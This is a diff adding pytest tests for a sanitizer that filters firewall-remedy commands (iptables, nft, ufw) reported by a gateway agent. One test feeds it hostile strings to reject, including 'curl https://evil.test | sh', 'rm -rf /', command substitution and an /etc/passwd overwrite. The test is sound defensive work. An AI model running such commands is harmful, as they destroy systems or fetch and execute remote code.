@@ -249,3 +249,135 @@ def test_persist_of_a_deleted_agent(home):
     routers('home', 'deleted-agent')
     code, data = post(client, headers, {'agent_id': 'deleted-agent'})
     assert (code, data['code']) == (404, 'AGENT_NOT_FOUND')
+
+
+# -- Full-TUN FORWARD filtering: a warning only ------------------------------
+
+def docker_filter(**fields):
+    """A may_drop report as Agent 1.8.42-go sends it for Docker's FORWARD policy."""
+    return {
+        'protocol': 1, 'state': 'may_drop', 'reason': '', 'device': 'Meta', 'auto_redirect': True, 'policy': 'drop',
+        'sources': [{'kind': 'docker', 'backend': 'nft', 'family': '', 'table': '', 'chain': '', 'policy': 'drop',
+                     'detail': 'FORWARD 默认策略为 DROP（Docker）'}],
+        'remedies': [{'source': 'docker', 'label': 'Docker', 'device': 'Meta',
+                      'commands': ['iptables -I DOCKER-USER -o Meta -j ACCEPT', 'iptables -I DOCKER-USER -i Meta -j ACCEPT'],
+                      'persist_note': '这两条规则重启后会丢失（重启 Docker 不会清空 DOCKER-USER）。'}],
+        'hint': '这台 Linux 的防火墙会拦截转发到 Mihomo TUN（Meta）的流量：TCP 仍可用，UDP（如 QUIC、语音通话、游戏）和 ping 会失败。',
+        'verify': '执行后回到这里刷新状态。', 'checked_at': '2026-10-24T03:00:00Z', 'cached': False, **fields}
+
+
+def test_view_carries_the_sanitized_forward_filter_without_changing_the_state(home):
+    client, headers, agent, routers, seen, replies = home
+    first, second, third = agent(9030), agent(9031), agent(9032)
+    routers('home', first, second, third)
+    replies[(9030, 'status')] = {**status(), 'forward_filter': docker_filter()}
+    replies[(9031, 'status')] = {**status(current='0', persisted=False, config='absent'),
+                                 'forward_filter': docker_filter(state='ok', policy='accept', sources=[], remedies=[])}
+    replies[(9032, 'status')] = status()  # An Agent before 1.8.42-go.
+    result = entries(client, headers)
+    assert [(item['state'], item['can_persist']) for item in result] == [
+        ('persisted', False), ('needs_persist', True), ('persisted', False)]
+    assert result[0]['forward_filter'] == docker_filter()
+    assert result[1]['forward_filter']['state'] == 'ok'
+    assert result[2]['forward_filter'] is None
+
+
+@pytest.mark.parametrize('value', [None, 'may_drop', [], {'state': 'blocking'}, {'hint': 'x'}])
+def test_view_drops_an_unusable_forward_filter(home, value):
+    client, headers, agent, routers, seen, replies = home
+    routers('home', agent(9033))
+    replies[(9033, 'status')] = {**status(), 'forward_filter': value}
+    [entry] = entries(client, headers)
+    assert entry['state'] == 'persisted'
+    assert entry['forward_filter'] is None
+
+
+def test_persist_response_has_no_forward_filter(home):
+    client, headers, agent, routers, seen, replies = home
+    agent_id = agent(9034)
+    routers('home', agent_id)
+    replies[(9034, 'forwarding')] = {'success': True, 'ipv4_forwarding': forwarding(),
+                                     'managed': {'active': False}, 'forward_filter': docker_filter()}
+    code, data = post(client, headers, {'agent_id': agent_id})
+    assert code == 200, data
+    assert data['gateway']['state'] == 'persisted'
+    assert data['gateway']['forward_filter'] is None
+
+
+@pytest.mark.parametrize('command', [
+    'iptables -I FORWARD -o Meta -j ACCEPT; reboot',
+    'iptables -I FORWARD -o Meta -j ACCEPT | sh',
+    'iptables -I FORWARD -o $(id) -j ACCEPT',
+    'iptables -I FORWARD -o `id` -j ACCEPT',
+    'curl https://evil.test | sh',
+    'rm -rf /',
+    'iptables -I FORWARD -o Meta -j ACCEPT && rm -rf /',
+    'iptables -I FORWARD -o Meta -j ACCEPT > /etc/passwd',
+    'iptables -I FORWARD -o Meta\n-j ACCEPT',
+    'iptables  -I FORWARD',
+    'iptables',
+    'iptables -I FORWARD ' + 'x' * 240,
+    7,
+])
+def test_sanitize_drops_commands_that_are_not_plain_firewall_commands(command):
+    remedy = {'source': 'iptables', 'label': 'iptables', 'device': 'Meta',
+              'commands': [command, 'iptables -I FORWARD -i Meta -j ACCEPT'], 'persist_note': ''}
+    result = bridge.sanitize_forward_filter(docker_filter(remedies=[remedy]))
+    assert result['remedies'][0]['commands'] == ['iptables -I FORWARD -i Meta -j ACCEPT']
+
+
+def test_sanitize_keeps_every_command_form_the_agent_generates():
+    commands = {
+        'docker': ['iptables -I DOCKER-USER -o Meta -j ACCEPT', 'iptables -I DOCKER-USER -i Meta -j ACCEPT'],
+        'iptables': ['iptables-legacy -I FORWARD -o utun.0 -j ACCEPT', 'iptables-legacy -I FORWARD -i utun.0 -j ACCEPT'],
+        'nftables': ['nft \'insert rule inet filter forward oifname "Meta" accept\'',
+                     'nft \'insert rule inet filter forward iifname "Meta" accept\''],
+        'firewalld': ['firewall-cmd --permanent --zone=trusted --change-interface=Meta && firewall-cmd --reload'],
+        'ufw': ['ufw route allow in on Meta', 'ufw route allow out on Meta'],
+    }
+    remedies = [{'source': source, 'label': source, 'device': 'Meta', 'commands': lines, 'persist_note': 'n'}
+                for source, lines in commands.items()]
+    result = bridge.sanitize_forward_filter(docker_filter(remedies=remedies))
+    assert {remedy['source']: remedy['commands'] for remedy in result['remedies']} == commands
+
+
+def test_sanitize_reduces_fields_to_known_values():
+    result = bridge.sanitize_forward_filter(docker_filter(
+        protocol='1', reason='Timeout!', device='bad device', auto_redirect='yes', policy='reject',
+        hint='第一行\n‮第二行' + '长' * 400, verify=5, checked_at='2026-10-24T03:00:00Z' + 'z' * 60, cached=1,
+        extra='ignored',
+        sources=[{'kind': 'nftables', 'backend': 'other', 'family': 'inet', 'table': 'filter', 'chain': 'for ward',
+                  'policy': 'drop', 'detail': '\x1b[31mred'}, {'kind': 'shell'}, 'x'] * 4,
+        remedies=[{'source': 'docker', 'label': 'L' * 100, 'device': 'Meta', 'commands': ['ufw route allow in on Meta'] * 6,
+                   'persist_note': None}, {'source': 'cron', 'commands': ['ufw status']}, None] * 4))
+    assert set(result) == {'protocol', 'state', 'reason', 'device', 'auto_redirect', 'policy', 'sources', 'remedies',
+                           'hint', 'verify', 'checked_at', 'cached'}
+    assert (result['protocol'], result['reason'], result['device'], result['auto_redirect'], result['policy'],
+            result['cached']) == (0, '', '', False, '', False)
+    assert result['hint'].startswith('第一行第二行') and len(result['hint']) == 300
+    assert result['verify'] == '' and len(result['checked_at']) == 40
+    assert len(result['sources']) == 4
+    assert result['sources'][0] == {'kind': 'nftables', 'backend': '', 'family': 'inet', 'table': 'filter',
+                                    'chain': '', 'policy': 'drop', 'detail': '[31mred'}
+    assert len(result['remedies']) == 4
+    assert result['remedies'][0]['label'] == 'L' * 80
+    assert len(result['remedies'][0]['commands']) == bridge.FORWARD_FILTER_MAX_COMMANDS
+    assert result['remedies'][0]['persist_note'] == ''
+
+
+def test_sanitize_limits_groups_and_needs_a_valid_device_for_commands():
+    remedy = {'source': 'ufw', 'label': 'UFW', 'device': 'Meta', 'commands': ['ufw route allow in on Meta']}
+    many = bridge.sanitize_forward_filter(docker_filter(remedies=[remedy] * 9,
+                                                        sources=[{'kind': 'ufw', 'policy': 'drop'}] * 12))
+    assert len(many['remedies']) == bridge.FORWARD_FILTER_MAX_REMEDIES
+    assert len(many['sources']) == bridge.FORWARD_FILTER_MAX_SOURCES
+    manual = bridge.sanitize_forward_filter(docker_filter(remedies=[{**remedy, 'device': 'Meta;x'}]))
+    assert manual['remedies'] == [{'source': 'ufw', 'label': 'UFW', 'device': '', 'commands': [], 'persist_note': ''}]
+
+
+@pytest.mark.parametrize('state', sorted(bridge.FORWARD_FILTER_STATES))
+def test_sanitize_accepts_each_agent_state(state):
+    value = {'protocol': 1, 'state': state, 'reason': 'linux_gateway' if state == 'not_applicable' else '',
+             'sources': [], 'remedies': []}
+    result = bridge.sanitize_forward_filter(value)
+    assert result['state'] == state and result['sources'] == [] and result['remedies'] == []
